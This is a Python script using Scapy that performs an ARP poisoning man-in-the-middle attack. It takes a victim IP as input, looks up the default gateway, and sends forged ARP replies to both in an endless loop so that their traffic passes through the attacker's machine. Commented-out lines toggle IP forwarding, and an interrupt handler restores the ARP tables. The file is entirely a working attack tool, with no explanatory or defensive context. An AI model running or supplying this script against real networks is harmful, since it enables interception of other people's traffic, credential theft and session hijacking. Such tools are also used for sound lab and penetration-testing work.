#!/usr/bin/python3
from warnings import filterwarnings
filterwarnings("ignore")

import os
from scapy.all import *
import sys

#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') # enable IP forwarding

#os.system('echo 0 > /proc/sys/net/ipv4/ip_forward') # disable IP forwarding

victimIP=sys.argv[1]
victimMAC=getmacbyip(victimIP)
print(victimIP, victimMAC)
gatewayIP=conf.route.route("0.0.0.0")[2]
gatewayMAC=getmacbyip(gatewayIP)
print("Starting ARP poison attack on "+victimIP+" and "+gatewayIP)
while True:
    try:
        
        send(ARP(op=2, pdst=victimIP, hwdst=victimMAC, psrc=gatewayIP))
        send(ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC, psrc=victimIP))
    except KeyboardInterrupt:
        print("Cleaning ARP tables...")
        print("Stopping ARP poison attack on "+victimIP+" and "+gatewayIP)
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)
        exit()
        
